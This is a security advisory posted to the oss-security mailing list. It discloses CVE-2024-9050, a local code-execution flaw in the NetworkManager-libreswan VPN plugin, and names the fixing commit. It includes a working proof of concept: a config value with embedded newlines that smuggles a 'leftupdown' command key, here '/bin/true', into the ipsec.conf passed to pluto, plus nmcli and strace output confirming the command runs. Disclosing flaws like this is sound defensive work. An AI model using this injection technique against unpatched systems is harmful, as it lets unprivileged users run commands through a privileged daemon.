Received: (qmail 29930 invoked by uid 550); 25 Oct 2024 01:21:55 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 7582 invoked from network); 25 Oct 2024 00:29:09 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
	s=mimecast20190719; t=1729816141;
	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
	 to:to:cc:mime-version:mime-version:content-type:content-type;
	bh=r5+BJ+xJcdJ4A+92pYdub+nvE9Vn8fC8tFp0JbBG5EQ=;
	b=QCjp8vCXf1zzYKNUUajo2fQjyXMaXMyd7pgj/e/NHTAqF6OLb0VGEd1Hp26nAkZjuj43cr
	3ePuTgIP+C/NYaNOmlvEhekZ8ysv8FUP3GzQV5/FaRgOzPd4YZ8vGtyp+vaKLumdB4IlI4
	ERZg8scci/gdqHRQM/ZfhKJjQv3lL7w=
X-MC-Unique: E59nkG7lNGyML1BFR8fYzg-1
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1729816140; x=1730420940;
        h=to:subject:message-id:date:from:mime-version:x-gm-message-state
         :from:to:cc:subject:date:message-id:reply-to;
        bh=r5+BJ+xJcdJ4A+92pYdub+nvE9Vn8fC8tFp0JbBG5EQ=;
        b=eMOYZ8NOgJry4XJUhlbWTHTP+YACTTZxnzqaaTjtHZ0jK0HNtaLIdKlnPayX3MRFCp
         D4hA05ssdUZ5QU4bZhjrj6rzk1ePUplI3r+yiCu2hr4EBuYqwj470lHMqU7OltbES2TA
         S10mWVAPWc1JW5ACHzE5O56HVPLK+EUpqvpes5N16BlF4gJx/j7oDoBEgJGAMmU9/44x
         9cj6T1co0kSqj0qiLJEhKYNppRIRsFygHYJVxQ636i8TRRlLEek5bQOHex2DGtdw5jAh
         qb4QBBmbmVFmhwcAwgAuEGmIZOEoiObrt06E2JgCM6rWfCZmIJe/MpbyWx+46gTCTnc9
         Ip0A==
X-Gm-Message-State: AOJu0YymqkFU5+RPNL8YH+zK8F0vF0gUn18rTZXtTvAmLZz3A822VyvO
	d5iVoJQgmbecU6LA6Fosvy499yOggimB3wiNBYAfekxQu6MMdqV0skMGYDE6q3E7yZXljWa/KYh
	uZnaVmA2SbeDTbOYHlELbhRGUFM46fFvgOdi3rHkOcGKtJDoylUbFZTkUvKm6QL7LZqUX1LEwAE
	5UmShJ3UDnAlZonlbGoWgDLJeuswVf6DSidu2aDtCNi30D/WD8sn8=
X-Received: by 2002:a05:690c:7649:b0:6e3:2192:e0e6 with SMTP id 00721157ae682-6e858167ee0mr40936447b3.14.1729816139713;
        Thu, 24 Oct 2024 17:28:59 -0700 (PDT)
X-Google-Smtp-Source: AGHT+IG3tSQ7QQ6rkgFyNdUhW4KBnATy+DzLuu/91gyUb824LY3uE/LxI4xXuv8PB+1t4cv/SD1DsaJMv0DSJB3y0Tw=
X-Received: by 2002:a05:690c:7649:b0:6e3:2192:e0e6 with SMTP id
 00721157ae682-6e858167ee0mr40936307b3.14.1729816139118; Thu, 24 Oct 2024
 17:28:59 -0700 (PDT)
MIME-Version: 1.0
From: Lubomir Rintel <lrintel@redhat.com>
Date: Fri, 25 Oct 2024 02:28:48 +0200
Message-ID: <CACQFvQHh9Ci5gkJ-a5CuWVQfNcK-TQOHS_ce6ufjjrsyv99xYw@mail.gmail.com>
To: oss-security@lists.openwall.com
X-Mimecast-Spam-Score: 0
X-Mimecast-Originator: redhat.com
Content-Type: text/plain; charset="UTF-8"
Subject: [oss-security] CVE-2024-9050: NetworkManager-libreswan IPSec VPN plugin local code execution

Hi,

We discovered and fixed a security issue in NetworkManager-libreswan,
where we fail to sanitize the VPN configuration from a local unprivileged
user and pass it directly to Libreswan upon an attempt to activate a
connection.

It's fixed in NetworkManager-libreswan.git version 1.2.24, in
commit dcf8acfb25bd ('all: rework formatting of ipsec.conf') [1]

[1] <https://gitlab.gnome.org/GNOME/NetworkManager-libreswan/-/commit/dcf8acfb25bd31e4b8cbd20c229da660238b5c1b>

The issue is assigned CVE-2024-9050. Details follow.

------------------------------ 8< ------------------------------

The libreswan connection configuration is simple key=value format, but we
fail to check for or escape special characters, including newlines, which
makes it possible for the user to trick us to treat values as key.

Unfortunately, there's one particular key that takes an executable command
as an argument: leftupdown (couldn't find more in ipsec.conf(5)). We
normally use it to specify the NM-libreswan callback, that would pass L3
configuration back to NM. It can be abused to execute arbitrary program.

Here's how (notice hostaddrfamily has a funny value that spans multiple
lines, including a leftupdown=/bin/true, which is plays the role of PoC
exploit payload):

  # nmcli -f vpn.data --show-secrets c show is
  vpn.data: hostaddrfamily = ipv4
  leftupdown=/bin/true
  ikev2=never
  leftxauthclient=yes
  leftusername=username
  phase2alg=aes256-sha1
  authby=secret
  left=%defaultroute
  leftmodecfgclient=yes
  right=172.31.79.2
  conn ign, leftid = groupname, leftxauthusername = username,
pskinputmodes = save, pskvalue-flags = 0, right = 172.31.79.2,
rightsubnet = 10.0.2.0/24, xauthpassword-flags = 0,
xauthpasswordinputmodes = save
  # strace -f -p$(pidof pluto) -eexecve &
  # nmcli c up is &
  ...
  strace: Process 103675 attached
  [pid 103675] execve("/bin/true", ["/bin/true"], 0x558af10a3e80 /* 62
vars */) = 0

This is how it's serialized in a keyfile:

  # cat /etc/NetworkManager/system-connections/is.nmconnection
  [connection]
  id=is
  uuid=418b5af9-63c6-4dfa-9d57-ff3dc3e00cfd
  type=vpn
  autoconnect=false
  timestamp=1726676158

  [vpn]
  leftid=groupname
  hostaddrfamily=ipv4\n leftupdown=/bin/true\n ikev2=never\n
leftxauthclient=yes\n leftusername=username\n phase2alg=aes256-sha1\n
authby=secret\n left=%defaultroute\n leftmodecfgclient=yes\n
right=172.31.79.2\nconn ign
  leftxauthusername=username
  pskinputmodes=save
  pskvalue-flags=0
  right=172.31.79.2
  rightsubnet=10.0.2.0/24
  xauthpassword-flags=0
  xauthpasswordinputmodes=save
  service-type=org.freedesktop.NetworkManager.libreswan

  [vpn-secrets]
  pskvalue=ipsecretkek
  xauthpassword=password

  [ipv4]
  method=auto

  [ipv6]
  addr-gen-mode=stable-privacy
  method=auto

  [proxy]

This is what gets passed to pluto (libreswan ipsec daemon), with an
inline comment:

  conn 418b5af9-63c6-4dfa-9d57-ff3dc3e00cfd
   aggrmode=yes
   leftid=@groupname
   hostaddrfamily=ipv4        # Our injected content is here.
   leftupdown=/bin/true       # This line gets the payload called.
   ikev2=never                # These lines are there so that
   leftxauthclient=yes        # the connection is well formed,
   leftusername=username      # and progresses to the point
   phase2alg=aes256-sha1      # it calls the script.
   authby=secret              # The last "conn ign" line
   left=%defaultroute         # shifts the other settings,
   leftmodecfgclient=yes      # including the original leftupdown
   right=172.31.79.2          # into a separate bogus connection,
  conn ign                    # so that they're effectively ignored.
   authby=secret
   left=%defaultroute
   leftmodecfgclient=yes
   leftupdown=\"/usr/libexec/nm-libreswan-service-helper 7 103758
org.freedesktop.NetworkManager.libreswan.Connection_31\"
   right=172.31.79.2
   rightmodecfgserver=yes
   modecfgpull=yes
   rightsubnet=10.0.2.0/24
   leftxauthclient=yes
   leftusername=username
   remote-peer-type=cisco
   rightxauthserver=yes
   ike=aes256-sha1;modp1536
   phase2alg=aes256-sha1
   ikelifetime=24h
   salifetime=24h
   rekey=yes
   keyingtries=1
   ikev2=never
   nm-configured=yes
   auto=add

I'm not seeing SELinux AVC denials.

------------------------------ 8< ------------------------------

Take care,
Lubo

